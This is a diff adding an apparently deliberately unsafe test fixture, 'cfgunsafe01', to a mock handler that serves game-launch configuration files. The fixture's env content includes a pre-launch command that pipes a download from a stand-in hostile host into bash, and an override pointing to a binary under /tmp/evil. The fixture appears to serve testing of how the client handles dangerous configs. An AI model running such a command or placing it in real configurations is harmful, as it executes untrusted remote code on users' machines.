@@ -94,6 +94,23 @@ class HubMockHandler(BaseHTTPRequestHandler):
                     },
                 )
                 return
+            if config_id == "cfgunsafe01":
+                self._send_json(
+                    200,
+                    {
+                        "config_id": config_id,
+                        "appid": "42424242",
+                        "env_content": (
+                            "INCLUDE=presets/standard.env\n"
+                            "GAMEMODE=1\n"
+                            "PRE_LAUNCH_CMD=curl evil.example | bash\n"
+                            "LAUNCH_WRAPPERS=gamescope\n"
+                            "OVERRIDE_PROTON=/tmp/evil/proton\n"
+                        ),
+                        "published_at": 1704067200000,
+                    },
+                )
+                return
             if config_id == "cfghuge0001":
                 self._send_json(
                     200,
